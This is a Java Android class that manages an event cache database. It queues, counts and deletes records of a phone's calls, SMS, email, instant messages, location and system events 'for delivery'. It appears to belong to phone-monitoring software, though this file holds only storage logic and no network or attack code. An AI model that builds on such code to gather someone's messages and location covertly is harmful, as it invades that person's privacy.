package com.fx.eventdb;

import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.fx.event.Event;
import com.fx.maind.ref.Customization;
import com.vvt.logger.FxLog;

public class EventDatabaseManager implements EventQueue.Callback {

	private static final String TAG = "EventDatabaseManager";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private static Object sMonitorObject = new Object();
	
	private static EventDatabaseManager sInstance;
	
	private Context mContext;
	private EventDatabaseHandlerThread mEventdbHandlerThread;
	private EventDatabaseHelper mEventdbHelper;
	
	public static EventDatabaseManager getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new EventDatabaseManager(context);
		}
		return sInstance;
	}
	
	private EventDatabaseManager(Context context) {
		mContext = context;
		
		// Initiate event.db, important!!
		mEventdbHelper = EventDatabaseHelper.getInstance();
		
		mEventdbHandlerThread = EventDatabaseHandlerThread.getInstance();
		mEventdbHandlerThread.start();
	}
	
	/**
	 * Inserts event to the cache database.
	 */
	public synchronized void insert(Event event) {
		if (LOGV) FxLog.v(TAG, "insert # ENTER ...");
		
		// Initialize event process
		InsertEventQueue processQueue = new InsertEventQueue(mContext, this, event);
		
		// Post process queue
		mEventdbHandlerThread.post(processQueue);
		
		// Make process waiting here will slow down an observer
	}
	
	/**
	 * Remove events list from database.
	 */
	public synchronized void remove(List<Event> eventList) {
		if (LOGV) {
			FxLog.v(TAG, "remove # ENTER ...");
		}
		
		if (eventList == null) {
			if (LOGV) {
				FxLog.v(TAG, "remove # [EVENT-DELIVER] list is null, nothing to remove.");
			}
			return;
		}
		
		if (eventList.size() == 0) {
			if (LOGV) {
				FxLog.v(TAG, "remove # [EVENT-DELIVER] list has no members, nothing to remove.");
			}
			return;
		}
		
		// Initialize process queue
		RemoveEventsQueue processQueue = new RemoveEventsQueue(mContext, this, eventList);
		
		// Post process queue
		mEventdbHandlerThread.post(processQueue);
		
		// Wait for process done
		makeProcessWait("remove");
	}
	
	public synchronized void removeAllEvents() {
		if (LOGV) {
			FxLog.v(TAG, "removeAllEvents # ENTER ...");
		}
		
		// Initialize process queue
		RemoveEventsQueue processQueue = new RemoveEventsQueue(mContext, this, true);
		
		// Post process queue
		mEventdbHandlerThread.post(processQueue);
		
		// Wait for process done
		makeProcessWait("removeAllEvents");
	}
	
	public synchronized List<Event> getEventsForDelivery() {
		if (LOGV) FxLog.v(TAG, "getEventsForDelivery # ENTER ...");
		
		// Create empty list and pass to process queue
		List<Event> eventList = new ArrayList<Event>();
		
		// Initialize process queue
		QueryEventsQueue processQueue = new QueryEventsQueue(mContext, this, eventList);
		
		// Post process queue
		mEventdbHandlerThread.post(processQueue);
		
		// Wait for process done
		makeProcessWait("getEventsForDelivery");
		
		if (LOGV) FxLog.v(TAG, "getEventsForDelivery # EXIT ...");
		
		return eventList;
	}
	
	public synchronized int countTotalEvents() {
		int totalEvents = 0;
		int subTotal = -1;
		
		StringBuilder builder = new StringBuilder();
		
		for (short type : Event.TYPES_LIST) {
			subTotal = countEvents(type, null);
			totalEvents += subTotal;
			
			if (builder.length() > 0) {
				builder.append(", ");
			}
			
			builder.append(Event.getTypeAsString(type)).append(": ").append(subTotal);
		}
		
		builder.append(", Total: ").append(totalEvents);
		
		FxLog.d(TAG, String.format("countTotalEvents # %s", builder.toString()));
		
		return totalEvents;
	}
	
	public int countIncomingCall() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Call.DIRECTION, Event.DIRECTION_IN);
		return countEvents(Event.TYPE_CALL, selection);
	}
	
	public int countOutgoingCall() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Call.DIRECTION, Event.DIRECTION_OUT);
		return countEvents(Event.TYPE_CALL, selection);
	}
	
	public int countMissedCall() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Call.DIRECTION, Event.DIRECTION_MISSED);
		return countEvents(Event.TYPE_CALL, selection);
	}
	
	public int countIncomingSms() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Sms.DIRECTION, Event.DIRECTION_IN);
		return countEvents(Event.TYPE_SMS, selection);
	}
	
	public int countOutgoingSms() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Sms.DIRECTION, Event.DIRECTION_OUT);
		return countEvents(Event.TYPE_SMS, selection);
	}
	
	public int countIncomingEmail() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Email.DIRECTION, Event.DIRECTION_IN);
		return countEvents(Event.TYPE_EMAIL, selection);
	}
	
	public int countOutgoingEmail() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Email.DIRECTION, Event.DIRECTION_OUT);
		return countEvents(Event.TYPE_EMAIL, selection);
	}
	
	public int countIncomingIm() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.IM.DIRECTION, Event.DIRECTION_IN);
		return countEvents(Event.TYPE_IM, selection);
	}
	
	public int countOutgoingIm() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.IM.DIRECTION, Event.DIRECTION_OUT);
		return countEvents(Event.TYPE_IM, selection);
	}
	
	public int countLocation() {
		return countEvents(Event.TYPE_LOCATION, null);
	}
	
	public int countSystem() {
		return countEvents(Event.TYPE_SYSTEM, null);
	}
	
	public int countIncomingSystem() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.System.DIRECTION, Event.DIRECTION_IN);
		return countEvents(Event.TYPE_SYSTEM, selection);
	}
	
	public int countOutgoingSystem() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.System.DIRECTION, Event.DIRECTION_OUT);
		return countEvents(Event.TYPE_SYSTEM, selection);
	}
	
	public Uri getEventUri(short eventType) {
		switch (eventType) {
			case Event.TYPE_CALL:
				return Uri.parse(EventDatabaseMetadata.Call.URI);
			case Event.TYPE_SMS:
				return Uri.parse(EventDatabaseMetadata.Sms.URI);
			case Event.TYPE_EMAIL:
				return Uri.parse(EventDatabaseMetadata.Email.URI);
			case Event.TYPE_LOCATION:
				return Uri.parse(EventDatabaseMetadata.Location.URI);
			case Event.TYPE_IM:
				return Uri.parse(EventDatabaseMetadata.IM.URI);
			case Event.TYPE_SYSTEM:
				return Uri.parse(EventDatabaseMetadata.System.URI);
			default:
				return null;
		}
	}
	
	/**
	 * Notify waiting object to continue the process
	 */
	@Override
	public void onProcessDone() {
		if (LOGV) {
			FxLog.v(TAG, "onProcessDone # ENTER ...");
		}
		synchronized (sMonitorObject) {
			sMonitorObject.notify();
		}
	}
	
	private void makeProcessWait(String processName) {
		synchronized (sMonitorObject) {
			
			boolean isWaiting = true;
			
			try {
				while (isWaiting) {
					if (LOGV) {
						FxLog.v(TAG, String.format(
								"makeProcessWait # Waiting for process: %s ...", 
								processName));
					}
					
					sMonitorObject.wait();
					
					if (LOGV) {
						FxLog.v(TAG, String.format(
								"makeProcessWait # Complete Process: %s", 
								processName));
					}
					isWaiting = false;
				}
			} 
			catch (InterruptedException e) {
				FxLog.e(TAG, String.format("makeProcessWait # Error: %s", e));
			}
		}
	}
	
	/**
	 * Count device events in database
	 */
	private int countEvents(short eventType, String selection) {
		int count = 0;
		
		Cursor cursor = mEventdbHelper.query(
				getEventUri(eventType), 
				new String[] {"count(*)"}, selection, null, null);
		
		if (cursor.moveToFirst()) {
			count = cursor.getInt(0);
		}
		
		if (cursor != null) {
			cursor.close();
		}
		
		return count;
	}
}
